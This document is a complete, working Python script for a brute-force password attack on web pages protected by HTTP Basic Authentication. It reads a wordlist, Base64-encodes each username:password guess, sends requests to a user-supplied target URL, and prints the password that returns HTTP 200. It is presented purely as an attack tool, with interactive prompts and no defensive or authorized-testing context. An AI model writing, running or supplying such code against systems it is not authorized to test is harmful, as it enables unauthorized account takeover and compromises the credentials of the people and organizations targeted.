import requests
import base64

def brute_force(url, username, wordlist_file):
    """ Perform HTTP Basic Authentication brute-force attack using a wordlist """
    try:
        # Load wordlist file and read all non-empty lines (potential passwords)
        with open(wordlist_file, 'r', encoding='utf-8') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist file not found: {wordlist_file}")
        return

    print(f"[+] Loaded {len(passwords)} passwords. Starting brute-force...")

    for password in passwords:
        # Prepare credentials in 'username:password' format and encode them with Base64
        credentials = f"{username}:{password}"
        encoded_credentials = base64.b64encode(credentials.encode()).decode()
        headers = {
            'Authorization': f'Basic {encoded_credentials}'
        }

        try:
            # Send HTTP GET request with Authorization header
            response = requests.get(url, headers=headers)

            if response.status_code == 200:
                print(f"[✓] Successful login! Username: {username} | Password: {password}")
                return
            else:
                print(f"[-] Incorrect password: {password} (Status Code: {response.status_code})")

        except requests.RequestException as e:
            print(f"[!] Request error: {e}")

    print("[-] All passwords tried. No successful login found.")

if __name__ == "__main__":
    # Get user input for target URL, username and wordlist file
    target_url = input("Target URL (protected by Basic Auth): ").strip()
    user = input("Username: ").strip()
    wordlist = input("Wordlist file path: ").strip()

    # Start brute-force attack
    brute_force(target_url, user, wordlist)
